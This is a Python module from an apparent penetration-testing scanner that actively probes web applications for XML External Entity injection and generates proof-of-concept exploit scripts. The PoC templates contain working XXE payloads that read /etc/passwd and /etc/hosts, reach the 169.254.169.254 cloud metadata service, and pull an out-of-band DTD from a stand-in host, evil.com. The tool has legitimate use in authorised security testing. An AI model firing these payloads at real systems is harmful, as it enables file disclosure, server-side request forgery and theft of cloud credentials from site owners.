"""
Active vulnerability scanner for XXE (XML External Entity).
"""

import asyncio
import uuid
from typing import Dict, List, Optional, Set, Any
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
import logging

from pentest_scanner.utils.http_client import HTTPClient, ResponseWrapper
from pentest_scanner.utils.models import (
    Vulnerability, Severity, VulnerabilityCategory, CVSSScore,
    Evidence, ScanResult, HTTPRequest, HTTPResponse
)
from pentest_scanner.config.settings import (
    XXE_PAYLOADS, SEVERITY_CVSS_MAP
)

logger = logging.getLogger(__name__)


class XXEScanner:
    """XML External Entity (XXE) vulnerability scanner."""
    
    def __init__(self, client: HTTPClient, config, scan_result: ScanResult):
        self.client = client
        self.config = config
        self.scan_result = scan_result
        self.tested_parameters: Set[str] = set()
    
    async def run(self, endpoints: List) -> Dict[str, Any]:
        """Run XXE scans on discovered endpoints."""
        results = {
            "vulnerabilities_found": 0,
            "parameters_tested": 0,
            "xxe_findings": [],
        }
        
        for endpoint in endpoints:
            if hasattr(endpoint, 'url'):
                url = endpoint.url
            else:
                url = endpoint.get('url', '')
            
            if not url:
                continue
            
            # Test URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                if param_name in self.tested_parameters:
                    continue
                self.tested_parameters.add(param_name)
                results["parameters_tested"] += 1
                
                # Test XXE payloads
                for payload in XXE_PAYLOADS:
                    vuln = await self._test_xxe(url, param_name, payload)
                    if vuln:
                        results["vulnerabilities_found"] += 1
                        results["xxe_findings"].append(vuln.to_dict())
                        break
            
            # Test form parameters with XML content
            if hasattr(endpoint, 'forms') and endpoint.forms:
                for form in endpoint.forms:
                    await self._test_form_xxe(url, form, results)
            
            # Test POST endpoints with XML body
            await self._test_xml_post_endpoints(url, results)
        
        return results
    
    async def _test_xxe(self, url: str, param_name: str, payload: str) -> Optional[Vulnerability]:
        """Test for XXE in a URL parameter."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            
            headers = {"Content-Type": "application/xml"}
            response = await self.client.get(test_url, headers=headers)
            wrapper = ResponseWrapper(response)
            body = await wrapper.text()
            
            # Check for XXE indicators
            xxe_indicators = self._check_xxe_indicators(body, payload)
            
            if xxe_indicators:
                vuln = Vulnerability(
                    id=f"XXE_{uuid.uuid4().hex[:8].upper()}",
                    title=f"XML External Entity (XXE) Injection in parameter '{param_name}'",
                    description=f"Parameter '{param_name}' is vulnerable to XXE injection. The application processes XML input containing external entity references, allowing file read and SSRF.",
                    category=VulnerabilityCategory.XXE,
                    severity=Severity.HIGH,
                    cvss=CVSSScore(**SEVERITY_CVSS_MAP["high"]),
                    owasp_category="A05:2021 – Security Misconfiguration",
                    url=test_url,
                    parameter=param_name,
                    method="GET",
                    poc=f"XXE Payload: {payload[:200]}...",
                    poc_code=self._generate_xxe_poc(test_url, param_name, payload),
                    remediation="Disable external entity processing in XML parsers. Use safe parser configurations. Validate and sanitize XML input. Use JSON instead of XML where possible.",
                    references=[
                        "https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration",
                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        "https://portswigger.net/web-security/xxe"
                    ],
                    tags=["active", "xxe", "xml", "injection"],
                    confirmed=True
                )
                
                vuln.evidence.append(Evidence(
                    type="response",
                    description="XXE indicators detected in response",
                    data={"payload": payload, "indicators": xxe_indicators}
                ))
                vuln.request = HTTPRequest(method="GET", url=test_url, headers=headers)
                vuln.response = HTTPResponse(
                    status_code=response.status,
                    headers=dict(response.headers),
                    body=body[:2000],
                    url=test_url
                )
                
                self.scan_result.add_vulnerability(vuln)
                return vuln
                
        except Exception as e:
            logger.debug(f"Error testing XXE on {url} param {param_name}: {e}")
        
        return None
    
    def _check_xxe_indicators(self, body: str, payload: str) -> List[str]:
        """Check response for indicators of successful XXE."""
        indicators = []
        body_lower = body.lower()
        
        # File read indicators
        if "file:///etc/passwd" in payload:
            if "root:" in body and "daemon:" in body:
                indicators.append("etc_passwd_read")
            if "root:x:" in body:
                indicators.append("shadow_file_read")
        
        if "file:///etc/hosts" in payload:
            if "localhost" in body and "127.0.0.1" in body:
                indicators.append("etc_hosts_read")
        
        # Cloud metadata
        if "169.254.169.254" in payload or "metadata.google.internal" in payload:
            if any(kw in body_lower for kw in ["ami-id", "instance-id", "compute/internal"]):
                indicators.append("cloud_metadata_access")
        
        # Error messages indicating XML parsing
        if any(kw in body_lower for kw in [
            "xml parsing error", "saxparseexception", "xmlparseexception",
            "entity not found", "external entity", "doctype is disallowed",
            "entity reference", "undeclared entity"
        ]):
            indicators.append("xml_parsing_error")
        
        # Successful entity expansion (data returned in response)
        if len(body) > 1000 and "root:" in body:
            indicators.append("entity_expansion_success")
        
        return indicators
    
    async def _test_form_xxe(self, url: str, form: Dict, results: Dict):
        """Test XXE in form inputs that might accept XML."""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])
        
        if not action:
            action = url
        elif not action.startswith('http'):
            action = urljoin(url, action)
        
        # Check if form might accept XML (file upload, textarea, etc.)
        for input_field in inputs:
            input_name = input_field.get('name', '')
            input_type = input_field.get('type', 'text')
            
            if input_type in ['file', 'textarea'] or 'xml' in input_name.lower():
                if input_name in self.tested_parameters:
                    continue
                self.tested_parameters.add(input_name)
                results["parameters_tested"] += 1
                
                for payload in XXE_PAYLOADS[:3]:
                    vuln = await self._test_form_input_xxe(action, method, input_name, payload, inputs)
                    if vuln:
                        results["vulnerabilities_found"] += 1
                        results["xxe_findings"].append(vuln.to_dict())
                        break
    
    async def _test_form_input_xxe(self, action: str, method: str, input_name: str, payload: str, all_inputs: List) -> Optional[Vulnerability]:
        """Test XXE in a specific form input."""
        try:
            form_data = {}
            for inp in all_inputs:
                name = inp.get('name', '')
                if name == input_name:
                    form_data[name] = payload
                elif inp.get('type') not in ['submit', 'button', 'image']:
                    form_data[name] = inp.get('value', 'test')
            
            headers = {"Content-Type": "application/xml"}
            if method == "POST":
                response = await self.client.post(action, data=form_data, headers=headers)
            else:
                response = await self.client.get(action, params=form_data, headers=headers)
            
            wrapper = ResponseWrapper(response)
            body = await wrapper.text()
            
            xxe_indicators = self._check_xxe_indicators(body, payload)
            
            if xxe_indicators:
                vuln = Vulnerability(
                    id=f"XXE_FORM_{uuid.uuid4().hex[:8].upper()}",
                    title=f"XXE in form input '{input_name}'",
                    description=f"Form input '{input_name}' is vulnerable to XXE injection via {method} request.",
                    category=VulnerabilityCategory.XXE,
                    severity=Severity.HIGH,
                    cvss=CVSSScore(**SEVERITY_CVSS_MAP["high"]),
                    owasp_category="A05:2021 – Security Misconfiguration",
                    url=action,
                    parameter=input_name,
                    method=method,
                    poc=f"Submit XML with XXE payload to {action}",
                    poc_code=self._generate_form_xxe_poc(action, method, input_name, payload, form_data),
                    remediation="Disable external entity processing. Use safe XML parser configurations. Validate XML input.",
                    references=[
                        "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        "https://portswigger.net/web-security/xxe"
                    ],
                    tags=["active", "xxe", "form", "xml", "injection"],
                    confirmed=True
                )
                
                vuln.evidence.append(Evidence(
                    type="response",
                    description="XXE indicators detected in form response",
                    data={"payload": payload, "input": input_name, "indicators": xxe_indicators}
                ))
                vuln.request = HTTPRequest(method=method, url=action, body=str(form_data), headers=headers)
                vuln.response = HTTPResponse(
                    status_code=response.status,
                    headers=dict(response.headers),
                    body=body[:2000],
                    url=str(response.url)
                )
                
                self.scan_result.add_vulnerability(vuln)
                return vuln
                
        except Exception as e:
            logger.debug(f"Error testing form XXE: {e}")
        
        return None
    
    async def _test_xml_post_endpoints(self, url: str, results: Dict):
        """Test endpoints that might accept XML POST bodies."""
        # Try common XML endpoints
        xml_endpoints = [
            url,
            urljoin(url, "/api"),
            urljoin(url, "/api/xml"),
            urljoin(url, "/soap"),
            urljoin(url, "/xmlrpc"),
            urljoin(url, "/rest"),
        ]
        
        for endpoint in xml_endpoints:
            for payload in XXE_PAYLOADS[:2]:
                try:
                    headers = {"Content-Type": "application/xml"}
                    response = await self.client.post(endpoint, data=payload, headers=headers)
                    wrapper = ResponseWrapper(response)
                    body = await wrapper.text()
                    
                    xxe_indicators = self._check_xxe_indicators(body, payload)
                    
                    if xxe_indicators:
                        vuln = Vulnerability(
                            id=f"XXE_POST_{uuid.uuid4().hex[:8].upper()}",
                            title=f"XXE via XML POST body",
                            description=f"Endpoint accepts XML POST data and is vulnerable to XXE injection.",
                            category=VulnerabilityCategory.XXE,
                            severity=Severity.HIGH,
                            cvss=CVSSScore(**SEVERITY_CVSS_MAP["high"]),
                            owasp_category="A05:2021 – Security Misconfiguration",
                            url=endpoint,
                            parameter="xml_body",
                            method="POST",
                            poc=f"POST XML with XXE payload to {endpoint}",
                            poc_code=self._generate_post_xxe_poc(endpoint, payload),
                            remediation="Disable external entity processing in XML parsers. Use safe parser configurations.",
                            references=[
                                "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
                            ],
                            tags=["active", "xxe", "post", "xml", "injection"],
                            confirmed=True
                        )
                        
                        vuln.evidence.append(Evidence(
                            type="response",
                            description="XXE indicators in XML POST response",
                            data={"indicators": xxe_indicators}
                        ))
                        vuln.request = HTTPRequest(method="POST", url=endpoint, body=payload, headers=headers)
                        vuln.response = HTTPResponse(
                            status_code=response.status,
                            headers=dict(response.headers),
                            body=body[:2000],
                            url=str(response.url)
                        )
                        
                        self.scan_result.add_vulnerability(vuln)
                        results["vulnerabilities_found"] += 1
                        results["xxe_findings"].append(vuln.to_dict())
                        return
                        
                except Exception as e:
                    logger.debug(f"Error testing XML POST on {endpoint}: {e}")
    
    def _generate_xxe_poc(self, url: str, param: str, payload: str) -> str:
        """Generate proof of concept code for XXE."""
        base_url = url.split('?')[0]
        return f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for XML External Entity (XXE) Injection
Target: {url}
Parameter: {param}
\"\"\"

import requests
from urllib.parse import urlencode

# Target URL
base_url = "{base_url}"
param_name = "{param}"

# XXE payloads
xxe_payloads = [
    # File read
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>''',
    # SSRF via XXE
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>''',
    # OOB XXE
    '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><data>&send;</data>''',
]

headers = {{"Content-Type": "application/xml"}}

print("[+] Testing XXE payloads:")

for i, payload in enumerate(xxe_payloads, 1):
    print(f"\\n[+] Payload {{i}}: {{payload[:100]}}...")
    
    # Test via GET parameter
    params = {{param_name: payload}}
    test_url = f"{{base_url}}?{{urlencode(params)}}"
    
    try:
        response = requests.get(test_url, headers=headers, timeout=10)
        print(f"    Status: {{response.status_code}}")
        print(f"    Length: {{len(response.text)}}")
        
        if "root:" in response.text:
            print("    [!!!] /etc/passwd READ - CRITICAL")
        elif "localhost" in response.text and "127.0.0.1" in response.text:
            print("    [!!!] /etc/hosts READ - HIGH")
        elif "ami-id" in response.text or "instance-id" in response.text:
            print("    [!!!] CLOUD METADATA ACCESS - CRITICAL")
            
    except Exception as e:
        print(f"    Error: {{e}}")

print(f"\\n[+] Original vulnerable URL: {url}")
"""
    
    def _generate_form_xxe_poc(self, action: str, method: str, input_name: str, payload: str, form_data: Dict) -> str:
        """Generate PoC for form-based XXE."""
        return f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for Form-based XXE
Target: {action}
Method: {method}
Parameter: {input_name}
\"\"\"

import requests

# Target URL
target_url = "{action}"
method = "{method}"

# Form data with XXE payload
form_data = {form_data}
xxe_payload = '''{payload}'''
form_data["{input_name}"] = xxe_payload

headers = {{"Content-Type": "application/xml"}}

print(f"[+] Testing XXE via form submission to {{target_url}}")

try:
    if method == "POST":
        response = requests.post(target_url, data=form_data, headers=headers, timeout=10)
    else:
        response = requests.get(target_url, params=form_data, headers=headers, timeout=10)
    
    print(f"    Status: {{response.status_code}}")
    print(f"    Length: {{len(response.text)}}")
    
    if "root:" in response.text:
        print("    [!!!] /etc/passwd READ - CRITICAL")
    elif "localhost" in response.text and "127.0.0.1" in response.text:
        print("    [!!!] /etc/hosts READ - HIGH")
    elif "ami-id" in response.text or "instance-id" in response.text:
        print("    [!!!] CLOUD METADATA ACCESS - CRITICAL")

except Exception as e:
    print(f"    Error: {{e}}")

print(f"\\n[+] Manual test: Submit form to {{target_url}} with XML payload")
"""
    
    def _generate_post_xxe_poc(self, endpoint: str, payload: str) -> str:
        """Generate PoC for POST-based XXE."""
        return f"""#!/usr/bin/env python3
\"\"\"
Proof of Concept for POST-based XXE
Target: {endpoint}
\"\"\"

import requests

# Target URL
target_url = "{endpoint}"

# XXE payload
payload = '''{payload}'''

headers = {{"Content-Type": "application/xml"}}

print(f"[+] Testing XXE via XML POST to {{target_url}}")

try:
    response = requests.post(target_url, data=payload, headers=headers, timeout=10)
    print(f"    Status: {{response.status_code}}")
    print(f"    Length: {{len(response.text)}}")
    
    if "root:" in response.text:
        print("    [!!!] /etc/passwd READ - CRITICAL")
    elif "localhost" in response.text and "127.0.0.1" in response.text:
        print("    [!!!] /etc/hosts READ - HIGH")
    elif "ami-id" in response.text or "instance-id" in response.text:
        print("    [!!!] CLOUD METADATA ACCESS - CRITICAL")

except Exception as e:
    print(f"    Error: {{e}}")

print(f"\\n[+] Manual test: POST XML to {{target_url}}")
"""